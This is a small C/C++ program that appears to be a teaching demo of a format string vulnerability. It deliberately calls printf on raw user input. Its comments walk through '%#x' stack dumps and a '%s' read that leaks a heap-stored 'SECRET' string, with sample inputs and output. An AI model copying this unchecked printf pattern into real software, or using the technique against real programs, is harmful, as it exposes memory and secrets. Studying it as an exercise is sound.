#include <stdio.h>
#include <string.h>
#include <iostream>

// to exploit this, use "%#x" to dump the stack
// and then use "%s" to dump the secret

// stack dump
// IN VAL: 42
// IN STR: %#x%#x%#x%#x%#x%#x%#x%#x%#x%#x%#x%#x%#x%#x%#x%#x
// 00xddedb0c80x6d7db1a00x6d7db1600x28f040c00x300x600x28f040800x123456780x420x6d7db3180x10x6d7db2f00x873710e000

// finding the right variable
// IN VAL: 42
// IN STR: %#x%#x%#x%#x%#x%#x%#x%#x%#x%#x      
// 00xddedb0c80x6d7db1a00x6d7db1600x28f040c00x1e0x600x28f040800x123456780x42

// inputing the wished address
// IN VAL: 28f04080
// IN STR: %#x%#x%#x%#x%#x%#x%#x%#x
// 00xddedb0c80x6d7db1a00x6d7db1600x28f040c00x180x600x28f04080

// printing the secret
// IN VAL: 28f04080
// IN STR: %#x%#x%#x%#x%#x%#x%#x%s 
// 00xddedb0c80x6d7db1a00x6d7db1600x28f040c00x170x60SECRET

int main(int argc, char * argv[]) {
    long int x = 0xAABBCCDD;
    volatile long int y = 0x12345678;
    volatile char *secret = (char *) malloc(7);
    secret[0] = 'S';
    secret[1] = 'E';
    secret[2] = 'C';
    secret[3] = 'R';
    secret[4] = 'E';
    secret[5] = 'T';
    secret[6] = '\0';
    std::string input;
    while(1) {
        printf("IN VAL: ");
        std::cin >> std::hex >> x;
        printf("IN STR: ");
        std::cin >> input;
        printf(input.c_str());
        printf("\n");
    }
}
